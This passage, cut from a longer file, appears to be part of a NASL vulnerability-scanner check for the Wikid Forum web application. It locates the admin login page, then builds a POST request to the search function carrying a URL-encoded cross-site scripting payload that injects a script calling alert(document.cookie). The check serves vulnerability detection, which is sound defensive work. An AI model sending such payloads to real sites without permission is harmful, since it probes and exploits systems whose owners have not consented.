...
for dir in nasl_make_list_unique( "/", "/wiki", "/wikidforum", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/admin/login.php" ), port: port );
	rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
	if(rcvRes && ( ContainsString( rcvRes, "\"Wikid Forum" ) || ( ContainsString( rcvRes, ">Wiki - Admin<" ) && ContainsString( rcvRes, "loginboxmain" ) && ContainsString( rcvRes, "loginimgmain" ) ) )){
		postdata = "txtsearch=%27%22%3C%2Fscript%3E%3Cscript%3Ealert%28" + "document.cookie%29%3C%2Fscript%3E";
		req = NASLString( "POST ", dir, "/index.php?action=search&mode=search HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
